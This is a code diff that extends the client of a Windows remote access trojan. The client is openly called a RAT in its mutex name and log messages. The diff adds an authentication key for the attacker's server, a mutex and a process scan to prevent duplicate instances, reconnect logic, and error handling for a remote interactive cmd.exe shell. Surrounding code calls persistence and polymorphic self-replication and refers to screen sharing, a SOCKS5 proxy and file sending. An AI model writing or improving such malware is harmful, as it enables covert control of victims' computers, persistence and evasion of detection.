@@ -33,6 +33,12 @@ using namespace Gdiplus;
 #define BUFFER_SIZE 1024
 #define SERVER_IP "127.0.0.1" // Change to your server IP
 
+// ===== AUTHENTICATION KEY =====
+// IMPORTANT: Change this key before compiling the client!
+// This key must match the server authentication key
+#define AUTH_KEY "TxTxT" // Change this to your custom authentication key
+// ================================
+
 // Screen sharing globals
 static bool g_screen_sharing_active = false;
 static HANDLE g_screen_sharing_thread = NULL;
@@ -1650,6 +1656,62 @@ std::string terminate_process(const std::string &pid_str)
     return "Process with PID " + pid_str + " terminated successfully";
 }
 
+// Function to check if socket connection is still alive
+bool is_socket_connected(SOCKET sock) {
+    if (sock == INVALID_SOCKET) return false;
+    
+    // Send a zero-byte message to check connection status
+    int result = send(sock, "", 0, 0);
+    if (result == SOCKET_ERROR) {
+        int error = WSAGetLastError();
+        if (error == WSAECONNRESET || error == WSAECONNABORTED || 
+            error == WSAENOTCONN || error == WSAENETRESET) {
+            return false;
+        }
+    }
+    return true;
+}
+
+// Function to safely send data with error handling
+bool safe_send(SOCKET sock, const char* data, int length) {
+    if (!is_socket_connected(sock)) {
+        std::cout << "Socket not connected, cannot send data" << std::endl;
+        return false;
+    }
+    
+    int total_sent = 0;
+    while (total_sent < length) {
+        int sent = send(sock, data + total_sent, length - total_sent, 0);
+        if (sent == SOCKET_ERROR) {
+            int error = WSAGetLastError();
+            std::cout << "Send error: " << error << std::endl;
+            return false;
+        }
+        total_sent += sent;
+    }
+    return true;
+}
+
+// Function to safely receive data with error handling
+int safe_recv(SOCKET sock, char* buffer, int buffer_size) {
+    if (!is_socket_connected(sock)) {
+        std::cout << "Socket not connected, cannot receive data" << std::endl;
+        return -1;
+    }
+    
+    int bytes_received = recv(sock, buffer, buffer_size, 0);
+    if (bytes_received == SOCKET_ERROR) {
+        int error = WSAGetLastError();
+        if (error == WSAETIMEDOUT) {
+            std::cout << "Receive timeout" << std::endl;
+        } else {
+            std::cout << "Receive error: " << error << std::endl;
+        }
+        return -1;
+    }
+    return bytes_received;
+}
+
 // Interactive shell execution with real-time output streaming
 bool interactive_shell(SOCKET sock)
 {
@@ -1730,12 +1792,17 @@ bool interactive_shell(SOCKET sock)
         
         while ((bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0)) > 0)
         {
+            buffer[bytesReceived] = '\0'; // Null terminate
+            
             // Handle different commands
-            if (strncmp(buffer, "screenshot", 10) == 0) {
+            if (strncmp(buffer, "screenshot", 10) == 0 || 
+                strncmp(buffer, "exit_shell", 10) == 0 ||
+                strncmp(buffer, "##EXIT_SHELL##", 14) == 0) {
                 // Send exit command to cmd.exe
                 const char* exitCmd = "exit\r\n";
                 DWORD bytesWritten;
                 WriteFile(hStdInWr, exitCmd, strlen(exitCmd), &bytesWritten, NULL);
+                std::cout << "Shell exit command received, terminating session..." << std::endl;
                 break;
             }
             
@@ -1746,8 +1813,15 @@ bool interactive_shell(SOCKET sock)
             // Write to process stdin
             DWORD bytesWritten;
             if (!WriteFile(hStdInWr, command.c_str(), command.length(), &bytesWritten, NULL)) {
+                std::cout << "Failed to write to process stdin, connection may be lost" << std::endl;
                 break;
             }
+        }
+        
+        // Check if connection was lost
+        if (bytesReceived <= 0) {
+            int error = WSAGetLastError();
+            std::cout << "Connection lost in shell thread, error: " << error << std::endl;
         }
         
         delete params;
@@ -1778,9 +1852,12 @@ bool interactive_shell(SOCKET sock)
             continue;
         }
         
-        // Send to socket
+        // Send to socket with error handling
         buffer[bytesRead] = '\0';
-        send(sock, buffer, bytesRead, 0);
+        if (!safe_send(sock, buffer, bytesRead)) {
+            std::cout << "Failed to send shell output, connection lost" << std::endl;
+            break;
+        }
     }
     
     // Clean up
@@ -1791,7 +1868,9 @@ bool interactive_shell(SOCKET sock)
     
     // Send shell end marker
     const char* shell_end = "##SHELL_SESSION_ENDED##";
-    send(sock, shell_end, strlen(shell_end), 0);
+    if (!safe_send(sock, shell_end, strlen(shell_end))) {
+        std::cout << "Failed to send shell end marker" << std::endl;
+    }
     
     return true;
 }
@@ -3318,6 +3397,21 @@ bool send_file(SOCKET sock, const std::string& file_path)
 
 int main()
 {
+    // Create a more robust mutex to prevent multiple instances from same machine
+    // Use a unique system-wide mutex name based on the target server
+    std::string mutex_name = "Global\\RAT_CLIENT_" + std::string(SERVER_IP) + "_" + std::to_string(PORT);
+    HANDLE hMutex = CreateMutexA(NULL, TRUE, mutex_name.c_str());
+    
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        std::cout << "Another RAT client instance is already connected to this server. Exiting..." << std::endl;
+        if (hMutex) CloseHandle(hMutex);
+        return 0;
+    }
+    
+    if (hMutex == NULL) {
+        std::cout << "Failed to create mutex. Continuing anyway..." << std::endl;
+    }
+    
     // Establish persistence first
     establish_persistence();
     
@@ -3325,6 +3419,7 @@ int main()
     if (polymorphic::replicate_with_new_name()) {
         // If replication successful, exit current process
         // New process will be launched automatically
+        if (hMutex) CloseHandle(hMutex);
         return 0;
     }
     
@@ -3348,6 +3443,9 @@ int main()
     struct sockaddr_in serv_addr;
     char buffer[BUFFER_SIZE] = {0};
     std::string response;
+    bool connected_successfully = false;
+    int connection_attempts = 0;
+    const int MAX_CONNECTION_ATTEMPTS = 3; // Limit connection attempts
 
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
@@ -3356,15 +3454,76 @@ int main()
         return 1;
     }
 
-    while (true)
+    // Additional check: Look for other RAT processes running
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        
+        int rat_process_count = 0;
+        if (Process32First(hSnapshot, &pe32)) {
+            do {
+                std::string process_name;
+#ifdef UNICODE
+                char narrow_name[MAX_PATH];
+                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
+                process_name = std::string(narrow_name);
+#else
+                process_name = std::string(pe32.szExeFile);
+#endif
+                // Check if this looks like our RAT client (common names)
+                std::string lower_name = process_name;
+                std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);
+                
+                if (lower_name.find("rat") != std::string::npos || 
+                    lower_name.find("client") != std::string::npos ||
+                    lower_name.find("windows32") != std::string::npos ||
+                    pe32.th32ProcessID == GetCurrentProcessId()) {
+                    rat_process_count++;
+                }
+            } while (Process32Next(hSnapshot, &pe32));
+        }
+        CloseHandle(hSnapshot);
+        
+        if (rat_process_count > 1) {
+            std::cout << "Warning: Multiple potential RAT processes detected (" << rat_process_count << "). This may cause duplicate connections." << std::endl;
+        }
+    }
+    
+    // Main operation loop - handles both connection and reconnection
+    bool keep_running = true;
+    while (keep_running && connection_attempts < MAX_CONNECTION_ATTEMPTS)
     {
+        // Check if we're already connected and maintain connection
+        if (connected_successfully && sock != INVALID_SOCKET && is_socket_connected(sock)) {
+            std::cout << "Already connected to server, maintaining connection..." << std::endl;
+            // Skip to command processing loop (which is below)
+            // The existing command processing loop will handle the connection
+            break; // Exit connection loop and go to command processing
+        }
+        
+        // Only attempt connection if not already connected
+        std::cout << "Attempting to establish connection (Attempt " << (connection_attempts + 1) << "/" << MAX_CONNECTION_ATTEMPTS << ")..." << std::endl;
+        
         // Create socket
         if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
         {
             std::cout << "Socket creation error: " << WSAGetLastError() << std::endl;
-            Sleep(5000); // Use Sleep() on Windows (milliseconds)
+            connection_attempts++;
+            if (connection_attempts < MAX_CONNECTION_ATTEMPTS) {
+                Sleep(5000); // Use Sleep() on Windows (milliseconds)
+            }
             continue;
         }
+        
+        // Set socket options for better error detection
+        int keepalive = 1;
+        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepalive, sizeof(keepalive));
+        
+        // Set receive timeout
+        DWORD timeout = 30000; // 30 seconds
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
 
         // Configure server address
         memset(&serv_addr, 0, sizeof(serv_addr));
@@ -3381,26 +3540,47 @@ int main()
         }
 
         // Connect to server
-        std::cout << "Attempting to connect to server..." << std::endl;
+        connection_attempts++;
+        std::cout << "Attempting to connect to server... (Attempt " << connection_attempts << "/" << MAX_CONNECTION_ATTEMPTS << ")" << std::endl;
         if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
         {
             std::cout << "Connection failed: " << WSAGetLastError() << std::endl;
             closesocket(sock);
-            Sleep(5000);
+            if (connection_attempts < MAX_CONNECTION_ATTEMPTS) {
+                Sleep(5000);
+            }
             continue;
         }
 
-        std::cout << "Connected to server" << std::endl;
+        std::cout << "Connected to server successfully!" << std::endl;
+        connected_successfully = true;
 
-        // Command processing loop
-        while (true)
+        // Command processing loop with enhanced error handling
+        while (connected_successfully)
         {
             memset(buffer, 0, BUFFER_SIZE);
-            int bytes_read = recv(sock, buffer, BUFFER_SIZE, 0);
+            
+            // Check connection health periodically
+            if (!is_socket_connected(sock)) {
+                std::cout << "Connection lost, attempting to reconnect..." << std::endl;
+                connected_successfully = false;
+                break;
+            }
+            
+            int bytes_read = safe_recv(sock, buffer, BUFFER_SIZE - 1);
 
             if (bytes_read <= 0)
             {
-                std::cout << "Server disconnected" << std::endl;
+                int error = WSAGetLastError();
+                std::cout << "Server disconnected or receive error: " << error << std::endl;
+                connected_successfully = false; // Allow reconnection
+                break;
+            }
+            
+            // Add connection health check after receiving data
+            if (!is_socket_connected(sock)) {
+                std::cout << "Connection became invalid after receiving data" << std::endl;
+                connected_successfully = false;
                 break;
             }
 
@@ -3410,7 +3590,19 @@ int main()
             std::cout << "Received command: " << buffer << std::endl;
 
             // Process commands
-            if (strcmp(buffer, "sysinfo") == 0)
+            if (strcmp(buffer, "validate_client") == 0)
+            {
+                std::cout << "Server requesting client validation..." << std::endl;
+                // Send validation response with authentication key
+                response = "RAT_CLIENT_VALIDATED_v1.6:" + std::string(AUTH_KEY);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send validation response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
+                std::cout << "Authentication key sent to server" << std::endl;
+            }
+            else if (strcmp(buffer, "sysinfo") == 0)
             {
                 std::cout << "Sending system information..." << std::endl;
                 response = get_sysinfo();
@@ -3922,15 +4114,51 @@ int main()
                 send(sock, response.c_str(), response.length(), 0);
             }
         }
+        
+        // If we reach here, connection was lost or commands finished
+        closesocket(sock);
+        sock = INVALID_SOCKET;
+        
+        // If connection was lost, reset and attempt reconnection
+        if (!connected_successfully) {
+            std::cout << "Connection lost, will attempt to reconnect..." << std::endl;
+            if (sock != INVALID_SOCKET) {
+                closesocket(sock);
+                sock = INVALID_SOCKET;
+            }
+            Sleep(5000); // Wait before reconnection attempt
+            
+            // Reset connection attempts for reconnection and continue main loop
+            connection_attempts = 0;
+            continue; // Go back to main loop for reconnection
+        } else {
+            // Successful completion - exit main loop
+            keep_running = false;
+            break;
+        }
     }
     
-    // Cleanup (this should never be reached due to infinite loop, but good practice)
+    // Cleanup
+    if (sock != INVALID_SOCKET) {
+        closesocket(sock);
+    }
     stop_screen_sharing(); // Stop any active screen sharing
     stop_socks5_proxy(); // Stop any active SOCKS5 proxy
     DeleteCriticalSection(&g_screen_sharing_cs);
     DeleteCriticalSection(&g_proxy_cs);
     WSACleanup();
     Gdiplus::GdiplusShutdown(gdiplusToken);
+    
+    if (connected_successfully) {
+        std::cout << "Client session completed successfully." << std::endl;
+    } else {
+        std::cout << "Failed to establish connection after " << MAX_CONNECTION_ATTEMPTS << " attempts." << std::endl;
+    }
+    
+    // Release the mutex
+    if (hMutex) {
+        CloseHandle(hMutex);
+    }
     
     return 0;
 }
